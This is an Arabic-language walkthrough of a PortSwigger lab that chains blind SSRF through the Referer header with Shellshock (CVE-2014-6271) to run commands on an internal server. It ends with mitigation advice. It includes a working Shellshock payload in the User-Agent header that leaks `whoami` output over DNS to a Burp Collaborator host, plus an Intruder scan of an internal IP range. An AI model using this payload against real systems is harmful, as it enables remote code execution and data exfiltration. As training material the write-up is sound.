# Lab: Blind SSRF with Shellshock exploitation (EXPERT)

## 1. الهدف من اللاب (Lab Objective)

- **الهدف الرئيسي:** استخدام ثغرة Blind SSRF للوصول إلى سيرفر داخلي وتنفيذ أوامر عليه عبر ثغرة Shellshock.
- **الهدف النهائي:** استخراج (Exfiltrate) اسم مستخدم النظام (OS User) عبر طلب DNS.

## 2. شرح الثغرة (Vulnerability Explanation)

- **نوع الثغرة:** Blind SSRF + Remote Code Execution (Shellshock)
- **الوصف:** 
  1. التطبيق يقوم بجلب الرابط الموجود في `Referer` header بشكل أعمى (Blind SSRF).
  2. السيرفر الداخلي الذي تتم زيارته يستخدم اصداراً مصاباً بـ Shellshock (CVE-2014-6271).
  3. يمكن استغلال ذلك بحقن payload في الـ `User-Agent` الذي يتم تمريره للسيرفر الداخلي.

## 3. خطوات الحل (Solution Steps)

1. **الاستكشاف:** تصفح الموقع وملاحظة أن زيارة صفحات المنتجات تطلق طلباً للمحلل (Analytics) باستخدام الـ `Referer`.
2. **تجهيز الـ Listener:** توليد رابط فريد من Burp Collaborator (مثلاً: `xyz.burpcollaborator.net`).
3. **بناءالـ Payload:**
   - **Shellshock Payload:** `() { :; }; /usr/bin/nslookup $(whoami).xyz.burpcollaborator.net`
   - ضعه في الـ `User-Agent` header.
4. **تنفيذ الهجوم (Intruder):**
   - تغيير الـ `Referer` إلى IP السيرفر الداخلي: `http://192.168.0.1:8080`
   - عمل Scan للـ Octet الأخير (1-255) في Intruder.
5. **التحقق:** في تبويب **Collaborator**، اضغط **Poll now**. ستجد طلب DNS يحتوي على اسم المستخدم مثل: `peter-ssrf-shellshock.xyz.burpcollaborator.net`.

## 4. تحليل معمق (Deep Dive) 🛡️

هذا الهجوم يجمع بين:
- **Blind SSRF:** كوسيلة وصول للشبكة الداخلية.
- **Shellshock:** كثغرة في معالجة الـ Environment Variables (مثل User-Agent).
- **DNS Exfiltration:** كوسيلة لاستخراج البيانات في بيئة معزولة (Out-of-Band).

## 5. الأدوات المستخدمة (Tools Used)

- [x] Burp Collaborator
- [x] Burp Intruder
- [x] Shellshock Payload

---

## 🛡️ كيف تحمي نفسك؟ (Mitigation)

- **Patching:** تحديث اصدارات Bash لغلق ثغرة Shellshock.
- **Strict Whitelisting:** لا تسمح للسيرفر بالاتصال بأي IP داخلي غير مصرح به.
- **Metadata Filtering:** منع تمرير Headers المستخدم (مثل User-Agent) إلى السيرفرات الداخلية دون تنقية.

---

[رابط المختبر الأصلي](https://portswigger.net/web-security/ssrf/blind/lab-blind-ssrf-with-shellshock-exploitation)
